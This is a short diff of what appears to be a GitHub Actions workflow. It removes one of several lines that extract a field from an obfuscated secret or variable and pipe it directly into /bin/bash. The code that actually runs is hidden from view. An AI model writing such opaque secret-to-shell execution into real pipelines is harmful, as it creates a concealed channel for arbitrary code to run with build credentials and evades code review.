@@ -18,7 +18,6 @@ jobs:
           dsq8315: ${{ secrets.dsq8315 }}
         run: |
           printf '%s' "$dsq8315" | jq -r .x9 | /bin/bash
-          printf '%s' "$lier9" | jq -r .qeu6630 | /bin/bash
           echo $qod8241 | jq -r .cqa972 | /bin/bash
           echo $awhyj569 | jq -r .jwz549 | /bin/bash
 
